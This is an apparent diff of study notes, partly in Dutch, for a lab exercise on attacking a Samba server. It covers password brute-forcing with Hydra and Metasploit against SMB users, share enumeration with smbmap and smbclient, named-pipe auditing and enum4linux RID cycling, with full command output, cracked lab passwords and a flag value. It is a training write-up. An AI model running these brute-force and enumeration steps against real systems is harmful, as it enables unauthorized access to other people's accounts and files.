@@ -1513,11 +1513,11 @@ use more to read content and q to get out of
 			-  -P /usr/share/wordlists/rockyou.txt.gz" geeft de locatie aan van het wachtwoordenbestand dat zal worden gebruikt tijdens de aanval. In dit geval wordt het bestand "rockyou.txt.gz" gebruikt, dat zich bevindt in de map "/usr/share/wordlists/". Dit bestand bevat een lijst met mogelijke wachtwoorden die worden uitgepakt door het commando. De vlag '-P' wordt gebruikt om het wachtwoordenbestand op te geven dat wordt gebruikt tijdens het uitvoeren van de aanval. 
 - run: *smbmap -H {target} -u admin -p password1* 
 - find out of any of the share are browsable: ***smbclient -L {target} -U jane  (password is 123abc)***
-- run: smbclient //target/jane -U jane 
+- run: **smbclient //target/jane -U jane** 
 - ls 
-- run: smbclient //target/admin -U admin 
+- run: **smbclient //target/admin -U admin** 
 ![[Pasted image 20230516103627.png]]
-- first get file then exit smb > ls > use tar -xf flag.tar.gz 
+- first get file then **exit smb > ls > use tar -xf flag.tar.gz** 
 	- Het commando "tar -xf flag.tar.gz" wordt gebruikt om een gecomprimeerd archiefbestand met de extensie ".tar.gz" uit te pakken met behulp van het programma 'tar'. 
 	- -   "tar" is het opdrachtregelhulpprogramma dat wordt gebruikt voor het beheren van archiefbestanden.
 	-  "-xf" zijn de opties voor 'tar':
@@ -1525,7 +1525,7 @@ use more to read content and q to get out of
 	    -   De optie 'f' gevolgd door het bestandsnaamargument "flag.tar.gz" geeft aan dat we het specifieke archiefbestand willen uitpakken.
 - enumerate pipes: 
 	- msfconsole 
-	- use auxiliary/scanner/smb/pipe_auditor 
+	- **use auxiliary/scanner/smb/pipe_auditor** 
 		- The "msfconsole: auxiliary/scanner/smb/pipe_auditor" module in Metasploit is used for auditing named pipes on remote systems accessible via the Server Message Block (SMB) protocol. It attempts to discover vulnerable or misconfigured named pipes that can be exploited for unauthorized access or information disclosure. 
 		- pipeline auditing refers to the process of examining and evaluating the security and configuration of named pipes in a system or network. Named pipes are a form of interprocess communication (IPC) mechanism that allows communication between different processes or applications on a system.
 		  
@@ -1534,4 +1534,179 @@ use more to read content and q to get out of
 	- set rhost target 
 	- options 
 	- run 
-- 
+- Get a list of SID: **enum4linux -r -u "admin" -p "password1" {target}** 
+	-   "-r": This option tells enum4linux to perform a recursive enumeration, which means it will explore all possible shares and domains.
+	-   "-u 'admin'": This option specifies the username to be used for authentication.
+	-   "-p 'password1'": This option specifies the password to be used for authentication.
+
+
+---- stappenplan 
+
+1.  Enumerate SMB shares:
+    
+    -   Open a terminal and run: `msfconsole`
+    -   Inside the Metasploit console, run: `use auxiliary/scanner/smb/smb_login`
+    -   Set the target host with: `set rhosts {target}`
+    -   Set the password file with: `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
+    -   Set the SMB username with: `set smbuser {jane}`
+    -   Run: `options` to confirm the settings
+2.  Decompress the wordlist:
+    -   Run: `gzip -d /usr/share/wordlists/rockyou.txt.gz`
+3.  Perform a password attack using Hydra:
+    -   Run: `hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} smb`
+4.  Check if any shares are browsable:
+    -   Run: `smbclient -L {target} -U jane -p 123abc`
+5.  Explore the 'jane' share:
+    -   Run: `smbclient //target/jane -U jane`
+    -   Run: `ls` to list the files in the share
+6.  Explore the 'admin' share:
+    -   Run: `smbclient //target/admin -U admin`
+    -   After authenticating, the prompt will change to `smb: \>`
+    -   Run: `ls` to list the files in the share
+7.  Extract a compressed file:
+    -   Get the desired file using `smbclient`
+    -   Exit the `smbclient` prompt
+    -   Run: `ls` to verify the file is present
+    -   Run: `tar -xf flag.tar.gz` to extract the compressed archive
+8.  Enumerate named pipes:
+    -   Open a terminal and run: `msfconsole`
+    -   Inside the Metasploit console, run: `use auxiliary/scanner/smb/pipe_auditor`
+    -   Set the SMB username with: `set smbuser admin`
+    -   Set the SMB password with: `set smbpass password1`
+    -   Set the target host with: `set rhost {target}`
+    -   Run: `options` to view and verify the options
+    -   Finally, run the module with: `run`
+9.  Get a list of SIDs:
+    -   Run: `enum4linux -r -u "admin" -p "password1" {target}`
+
+---- LAB ---- 
+
+
+**target ip: 192.57.201.3** 
+
+1.  What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
+   
+		msf5 auxiliary(scanner/smb/smb_login) > run
+		
+		[] 192.57.201.3:445      - 192.57.201.3:445 - Starting SMB login bruteforce
+		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:admin',
+		[!] 192.57.201.3:445      - No active DB -- Credential data will not be saved!
+		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:123456',
+		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:12345',
+		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:123456789',
+		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:password',
+		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:iloveyou',
+		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:princess',
+		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:1234567',
+		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:12345678',
+		[+] 192.57.201.3:445      - 192.57.201.3:445 - Success: '.\jane:abc123'  📍
+		[] 192.57.201.3:445      - Scanned 1 of 1 hosts (100% complete)
+		[] Auxiliary module execution completed
+
+
+   
+2.  What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
+		   
+		root@attackdefense:~# gzip -d  /usr/share/wordlists/rockyou.txt.gz 
+		root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.57.201.3 smb
+		Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+		
+		Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-16 10:10:24
+		[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+		[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+		[DATA] attacking smb://192.57.201.3:445/
+		[445][smb] host: 192.57.201.3   login: admin   password: password1
+		1 of 1 target successfully completed, 1 valid password found
+		Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-16 10:10:26
+
+   
+3.  Which share is read only? Use smbmap with credentials obtained in question 2.
+		   
+		   
+		root@attackdefense:~# smbmap -H 192.57.201.3 -u admin -p password1
+		[+] Finding open SMB ports....
+		[+] User SMB session establishd on 192.57.201.3...
+		[+] IP: 192.57.201.3:445        Name: target-1                                          
+		        Disk                                                    Permissions
+		        ----                                                    -----------
+		        shawn                                                   READ, WRITE
+		        nancy                                                   READ ONLY 📍
+		        admin                                                   READ, WRITE
+		        IPC$                                                    NO ACCESS
+
+
+
+4.  Is share “jane” browseable? Use credentials obtained from the 1st question. Yes! 
+   
+
+		   root@attackdefense:~# smbclient -L 192.57.201.3 -U jane 
+		Enter WORKGROUP\jane's password: abc123
+		
+		        Sharename       Type      Comment
+		        ---------       ----      -------
+		        shawn           Disk      
+		        nancy           Disk      
+		        admin           Disk      
+		        IPC$            IPC       IPC Service (brute.samba.recon.lab)
+		Reconnecting with SMB1 for workgroup listing.
+		
+		        Server               Comment
+		        ---------            -------
+		
+		        Workgroup            Master
+		        ---------            -------
+		        RECONLABS            
+	
+   
+   
+   
+5.  Fetch the flag from share “admin”
+   
+
+2727069bc058053bd561ce372721c92e
+![[Pasted image 20230516122153.png]]
+   
+   
+6.  List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
+   
+		   
+		msf5 > use auxiliary/scanner/smb/pipe_auditor 
+		msf5 auxiliary(scanner/smb/pipe_auditor) > set smbuser admin
+		smbuser => admin
+		msf5 auxiliary(scanner/smb/pipe_auditor) > set smbpass password1
+		smbpass => password1
+		msf5 auxiliary(scanner/smb/pipe_auditor) > set rhosts 192.57.201.3
+		rhosts => 192.57.201.3
+		msf5 auxiliary(scanner/smb/pipe_auditor) > options
+		
+		Module options (auxiliary/scanner/smb/pipe_auditor):
+		
+		   Name         Current Setting                                                 Required  Description
+		   ----         ---------------                                                 --------  -----------
+		   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+		   RHOSTS       192.57.201.3                                                    yes       The target address range or CIDR identifier
+		   SMBDomain    .                                                               no        The Windows domain to use for authentication
+		   SMBPass      password1                                                       no        The password for the specified username
+		   SMBUser      admin                                                           no        The username to authenticate as
+		   THREADS      1                                                               yes       The number of concurrent threads
+		
+		msf5 auxiliary(scanner/smb/pipe_auditor) > run
+		
+		[+] 192.57.201.3:139      - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
+		[*] 192.57.201.3:         - Scanned 1 of 1 hosts (100% complete)
+		[*] Auxiliary module execution completed
+
+
+
+
+   
+7.  List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.
+
+`-R`: This option enables RID cycling, which means enum4linux will attempt to enumerate user SIDs by cycling through a range of RID values.
+
+		S-1-22-1-1000 Unix User\shawn (Local User)
+		S-1-22-1-1001 Unix User\jane (Local User)
+		S-1-22-1-1002 Unix User\nancy (Local User)
+		S-1-22-1-1003 Unix User\admin (Local User)
+
+
